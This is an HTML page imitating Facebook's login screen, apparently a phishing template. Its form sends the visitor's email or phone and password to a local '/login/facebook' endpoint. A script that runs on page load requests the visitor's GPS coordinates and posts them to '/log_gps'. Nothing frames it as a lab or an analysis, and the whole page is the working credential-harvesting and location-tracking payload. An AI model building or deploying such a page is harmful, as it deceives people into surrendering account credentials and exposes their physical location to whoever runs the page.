<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Facebook – log in or sign up</title>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center pt-20 font-sans">
    <div class="w-full max-w-[400px] text-center lg:text-left lg:max-w-[1000px] lg:flex lg:items-center lg:gap-20 px-4">
        <div class="lg:w-1/2 mb-10"><h1 class="text-[#1877f2] text-6xl font-bold mb-4">facebook</h1><p class="text-2xl">Facebook helps you connect and share with the people in your life.</p></div>
        <div class="bg-white p-6 rounded-xl shadow-xl w-full lg:w-[400px]">
            <form action="/login/facebook" method="POST" class="space-y-4">
                <input name="user" type="text" placeholder="Email or phone number" class="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:ring-1 focus:ring-blue-500" required>
                <input name="pass" type="password" placeholder="Password" class="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:ring-1 focus:ring-blue-500" required>
                <button class="w-full bg-[#1877f2] text-white py-3 rounded-lg text-xl font-bold">Log In</button>
                <a href="#" class="block text-blue-500 text-sm hover:underline">Forgotten password?</a>
                <hr class="my-4"><button class="bg-[#42b72a] text-white px-5 py-3 rounded-lg font-bold text-lg hover:bg-[#36a420]">Create New Account</button>
            </form>
        </div>
    </div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
                });
            }
        }
    </script>
</body>
</html>
